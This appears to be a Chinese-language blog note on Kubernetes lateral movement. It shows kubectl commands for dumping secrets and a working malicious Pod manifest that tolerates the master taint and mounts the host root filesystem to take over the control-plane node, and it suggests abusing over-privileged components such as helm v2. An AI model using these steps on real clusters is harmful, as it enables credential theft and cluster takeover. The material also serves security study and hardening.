---
title: "k8s渗透-横向移动"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# k8s渗透-横向移动

## 窃取凭证

### kubeconfig凭证

kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 [k8s渗透-初始访问](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/) 笔记中已经介绍了，这里不再说明

### secret对象

在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：
~~~sh
kubeconfig get secrets -A
~~~

![QQ_1757151099118](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png)

查看指定secret内容：
~~~sh
kubectl --kubeconfig config -n [指定命名空间] get secret [secret名称] -o yaml
~~~

![QQ_1757151463832](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png)

可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了

## 集群内网渗透

K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段

## 第三方组件风险

在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸

简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群

## 污点（taint）横向

这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限

污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上

其中污点有三种属性(效果)：

> 1. **NoSchedule**：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。
> 2. **PreferNoSchedule**：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 `PreferNoSchedule` 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。
> 3. **NoExecute**：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，`NoExecute` 污点会导致 Pod 被终止并迁移到其他节点。

一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点

比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：

~~~sh
cat > x.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: control-master-x
spec:
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  containers:
  - name: control-master-x
    image: ubuntu:18.04
    command: ["/bin/sleep", "3650d"]
    volumeMounts:
    - name: master
      mountPath: /master
  volumes:
  - name: master
    hostPath:
      path: /
      type: Directory
EOF
~~~

这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点

## 其他横向

之前笔记中提到的权限提升阶段的逃逸手法也能用于横向移动，另外，在高权限情况下接管dashboard也能直接在面板下发指令，实现横向

## 总结

可以看到k8s的横向方式都是换汤不换药，无非基于服务、凭证、逃逸、常规内网横向，很多问题都是管理员配置不当产生
